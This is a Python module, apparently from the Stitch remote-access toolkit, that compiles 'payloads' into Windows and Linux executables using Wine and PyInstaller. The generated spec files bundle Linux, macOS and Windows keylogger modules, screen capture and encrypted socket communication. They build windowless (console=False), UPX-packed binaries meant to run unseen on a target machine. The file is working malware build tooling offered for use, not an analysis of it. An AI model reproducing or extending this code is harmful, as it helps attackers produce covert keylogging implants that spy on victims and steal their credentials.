#!/usr/bin/env python3
"""
Cross-platform compilation support for Stitch payloads
Handles Windows executable generation from Linux servers
"""

import os
import sys
import subprocess
import shutil
import tempfile
from pathlib import Path
from .stitch_utils import st_print, st_log

class PayloadCompiler:
    """Handles cross-platform payload compilation"""
    
    def __init__(self):
        self.wine_available = self.check_wine()
        self.pyinstaller_available = self.check_pyinstaller()
        self.wine_python_path = None
        
    def check_wine(self):
        """Check if Wine is installed"""
        return shutil.which('wine') is not None
    
    def check_pyinstaller(self):
        """Check if PyInstaller is available"""
        try:
            import PyInstaller
            return True
        except ImportError:
            # Check if pyinstaller command is available
            return shutil.which('pyinstaller') is not None
    
    def install_pyinstaller(self):
        """Attempt to install PyInstaller"""
        try:
            st_print("[*] Installing PyInstaller...")
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
            self.pyinstaller_available = True
            return True
        except Exception as e:
            st_log.error(f"Failed to install PyInstaller: {e}")
            return False
    
    def setup_wine_python(self):
        """Setup Python in Wine environment for Windows cross-compilation"""
        if not self.wine_available:
            st_print("[!] Wine not installed. Cannot create Windows executables on Linux.")
            st_print("[*] To install Wine on Ubuntu/Debian: sudo apt-get install wine wine32 wine64")
            st_print("[*] To install Wine on RHEL/CentOS: sudo yum install wine")
            return False
        
        # Check common Wine Python locations
        wine_pythons = [
            os.path.expanduser('~/.wine/drive_c/Python39/python.exe'),
            os.path.expanduser('~/.wine/drive_c/Python38/python.exe'),
            os.path.expanduser('~/.wine/drive_c/Python37/python.exe'),
            '/opt/wine-python/python.exe',
        ]
        
        for python_path in wine_pythons:
            if os.path.exists(python_path):
                self.wine_python_path = python_path
                st_print(f"[+] Found Wine Python at: {python_path}")
                return True
        
        # Try to install Python in Wine
        try:
            st_print("[*] Setting up Python in Wine environment...")
            
            # Download Python installer
            python_url = 'https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe'
            installer_path = '/tmp/python-installer.exe'
            
            if not os.path.exists(installer_path):
                st_print("[*] Downloading Windows Python installer...")
                subprocess.run(['wget', '-q', '-O', installer_path, python_url], check=True)
            
            st_print("[*] Installing Python in Wine (this may take a few minutes)...")
            subprocess.run(['wine', installer_path, '/quiet', 'InstallAllUsers=1', 'PrependPath=1'], 
                         check=True, capture_output=True)
            
            # Install PyInstaller in Wine Python
            st_print("[*] Installing PyInstaller in Wine Python...")
            wine_python = os.path.expanduser('~/.wine/drive_c/Python39/python.exe')
            subprocess.run(['wine', wine_python, '-m', 'pip', 'install', '--quiet', 'pyinstaller'], 
                         check=True, capture_output=True)
            
            # Clean up
            if os.path.exists(installer_path):
                os.remove(installer_path)
            
            self.wine_python_path = wine_python
            st_print("[+] Wine Python environment setup complete")
            return True
            
        except subprocess.CalledProcessError as e:
            st_log.error(f"Wine Python setup failed: {e}")
            return False
        except Exception as e:
            st_log.error(f"Unexpected error during Wine setup: {e}")
            return False
    
    def compile_for_windows(self, source_dir, output_dir, payload_name='stitch_payload'):
        """Cross-compile Windows executable using Wine and PyInstaller"""
        
        if not self.wine_available:
            st_print("[!] Wine not available. Falling back to Python script.")
            return None
        
        if not self.wine_python_path and not self.setup_wine_python():
            st_print("[!] Failed to setup Wine Python environment.")
            return None
        
        try:
            st_print("[*] Cross-compiling Windows executable...")
            
            # Change to source directory
            original_dir = os.getcwd()
            os.chdir(source_dir)
            
            # Create PyInstaller spec file for Windows
            spec_content = f'''
# -*- mode: python -*-
import sys
sys.setrecursionlimit(5000)

block_cipher = None

a = Analysis(['st_main.py'],
             pathex=['{source_dir}'],
             binaries=[],
             datas=[],
             hiddenimports=[
                'st_utils', 'st_protocol', 'st_encryption', 'requirements',
                'st_lnx_keylogger', 'st_osx_keylogger', 'st_win_keylogger',
                'Crypto', 'Crypto.Cipher', 'Crypto.Cipher.AES', 'Crypto.Random',
                'mss', 'mss.linux', 'pexpect', 'pyxhook', 'requests', 'platform',
                'subprocess', 'threading', 'socket', 'base64', 'zlib'
            ],
             hookspath=[],
             runtime_hooks=[],
             excludes=['PyQt4', 'PyQt5', 'matplotlib', 'numpy', 'pandas'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
             
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='{payload_name}',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          upx_exclude=[],
          runtime_tmpdir=None,
          console=False,
          disable_windowed_traceback=False,
          target_arch=None,
          codesign_identity=None,
          entitlements_file=None)
'''
            
            spec_path = 'stitch_windows.spec'
            with open(spec_path, 'w') as f:
                f.write(spec_content)
            
            # Run PyInstaller via Wine (no --onefile/--noconsole with spec file)
            cmd = [
                'wine', self.wine_python_path, '-m', 'PyInstaller',
                f'--distpath={output_dir}',
                '--clean',
                spec_path
            ]
            
            st_print(f"[*] Running: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                exe_path = os.path.join(output_dir, f'{payload_name}.exe')
                if os.path.exists(exe_path):
                    st_print(f"[+] Windows executable created: {exe_path}")
                    
                    # Move to Binaries subdirectory
                    binary_dir = os.path.join(output_dir, 'Binaries')
                    os.makedirs(binary_dir, exist_ok=True)
                    final_path = os.path.join(binary_dir, f'{payload_name}.exe')
                    shutil.move(exe_path, final_path)
                    
                    os.chdir(original_dir)
                    return final_path
                else:
                    st_print("[!] Executable not found after compilation")
            else:
                st_print(f"[!] Wine PyInstaller failed:\n{result.stderr}")
            
            os.chdir(original_dir)
            return None
            
        except subprocess.TimeoutExpired:
            st_print("[!] Compilation timed out after 120 seconds")
            os.chdir(original_dir)
            return None
        except Exception as e:
            st_log.error(f"Windows cross-compilation error: {e}")
            os.chdir(original_dir)
            return None
    
    def compile_for_linux(self, source_dir, output_dir, payload_name='stitch_payload'):
        """Compile Linux executable using native PyInstaller"""
        
        if not self.pyinstaller_available:
            st_print("[!] PyInstaller not available. Attempting to install...")
            if not self.install_pyinstaller():
                st_print("[!] Failed to install PyInstaller. Returning Python script.")
                return None
        
        try:
            st_print("[*] Compiling Linux executable with PyInstaller...")
            
            # Change to source directory
            original_dir = os.getcwd()
            os.chdir(source_dir)
            
            # Create PyInstaller spec file for Linux
            spec_content = f'''
# -*- mode: python -*-
import sys
sys.setrecursionlimit(5000)

block_cipher = None

a = Analysis(['st_main.py'],
             pathex=['{source_dir}'],
             binaries=[],
             datas=[],
             hiddenimports=[
                'st_utils', 'st_protocol', 'st_encryption', 'requirements',
                'st_lnx_keylogger', 'st_osx_keylogger', 'st_win_keylogger',
                'Crypto', 'Crypto.Cipher', 'Crypto.Cipher.AES', 'Crypto.Random',
                'mss', 'mss.linux', 'pexpect', 'pyxhook', 'requests', 'platform',
                'subprocess', 'threading', 'socket', 'base64', 'zlib'
            ],
             hookspath=[],
             runtime_hooks=[],
             excludes=['PyQt4', 'PyQt5', 'matplotlib', 'numpy', 'pandas'],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
             
pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          [],
          name='{payload_name}',
          debug=False,
          bootloader_ignore_signals=False,
          strip=False,
          upx=True,
          upx_exclude=[],
          runtime_tmpdir=None,
          console=False)
'''
            
            spec_path = 'stitch_linux.spec'
            with open(spec_path, 'w') as f:
                f.write(spec_content)
            
            # Run PyInstaller (no --onefile/--noconsole with spec file)
            cmd = [
                'pyinstaller',
                f'--distpath={output_dir}',
                '--clean',
                spec_path
            ]
            
            st_print(f"[*] Running: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if result.returncode == 0:
                binary_path = os.path.join(output_dir, payload_name)
                if os.path.exists(binary_path):
                    st_print(f"[+] Linux executable created: {binary_path}")
                    
                    # Make executable
                    os.chmod(binary_path, 0o755)
                    
                    # Move to Binaries subdirectory
                    binary_dir = os.path.join(output_dir, 'Binaries')
                    os.makedirs(binary_dir, exist_ok=True)
                    final_path = os.path.join(binary_dir, payload_name)
                    shutil.move(binary_path, final_path)
                    
                    os.chdir(original_dir)
                    return final_path
                else:
                    st_print("[!] Binary not found after compilation")
            else:
                st_print(f"[!] PyInstaller failed:\n{result.stderr}")
            
            os.chdir(original_dir)
            return None
            
        except subprocess.TimeoutExpired:
            st_print("[!] Compilation timed out after 120 seconds")
            os.chdir(original_dir)
            return None
        except Exception as e:
            st_log.error(f"Linux compilation error: {e}")
            os.chdir(original_dir)
            return None
    
    def compile_payload(self, source_dir, output_dir, platform='auto', payload_name='stitch_payload'):
        """
        Main compilation method that handles all platforms
        
        Args:
            source_dir: Directory containing st_main.py and other source files
            output_dir: Directory to output compiled payload
            platform: Target platform ('windows', 'linux', 'auto')
            payload_name: Name for the output file (without extension)
        
        Returns:
            Path to compiled payload or None if compilation failed
        """
        
        # Auto-detect platform if not specified
        if platform == 'auto':
            import platform as plat
            system = plat.system().lower()
            if system == 'linux':
                platform = 'linux'
            elif system == 'darwin':
                platform = 'macos'
            elif system == 'windows':
                platform = 'windows'
            else:
                platform = 'linux'  # Default fallback
        
        st_print(f"[*] Compiling payload for {platform} platform...")
        
        # Ensure output directory exists
        os.makedirs(output_dir, exist_ok=True)
        
        # Compile based on target platform
        if platform == 'windows':
            # Try cross-compilation first, fall back to script
            result = self.compile_for_windows(source_dir, output_dir, payload_name)
            if not result:
                st_print("[*] Falling back to Python script for Windows target")
                return self.create_python_payload(source_dir, output_dir, payload_name)
        
        elif platform == 'linux':
            # Compile native Linux binary
            result = self.compile_for_linux(source_dir, output_dir, payload_name)
            if not result:
                st_print("[*] Falling back to Python script for Linux target")
                return self.create_python_payload(source_dir, output_dir, payload_name)
        
        elif platform == 'python':
            # Explicitly requested Python script
            return self.create_python_payload(source_dir, output_dir, payload_name)
        
        else:
            st_print(f"[!] Unsupported platform: {platform}")
            return self.create_python_payload(source_dir, output_dir, payload_name)
        
        return result
    
    def create_python_payload(self, source_dir, output_dir, payload_name='stitch_payload'):
        """Create a standalone Python script payload"""
        try:
            st_print("[*] Creating Python script payload...")
            
            # Create Binaries directory
            binary_dir = os.path.join(output_dir, 'Binaries')
            os.makedirs(binary_dir, exist_ok=True)
            
            # Copy main script
            source_file = os.path.join(source_dir, 'st_main.py')
            output_file = os.path.join(binary_dir, f'{payload_name}.py')
            
            if os.path.exists(source_file):
                shutil.copy2(source_file, output_file)
                st_print(f"[+] Python payload created: {output_file}")
                return output_file
            else:
                st_print(f"[!] Source file not found: {source_file}")
                return None
                
        except Exception as e:
            st_log.error(f"Failed to create Python payload: {e}")
            return None


# Global instance for easy access
payload_compiler = PayloadCompiler()


def compile_payload(source_dir, output_dir, platform='auto', payload_name='stitch_payload'):
    """Convenience function to compile payloads"""
    return payload_compiler.compile_payload(source_dir, output_dir, platform, payload_name)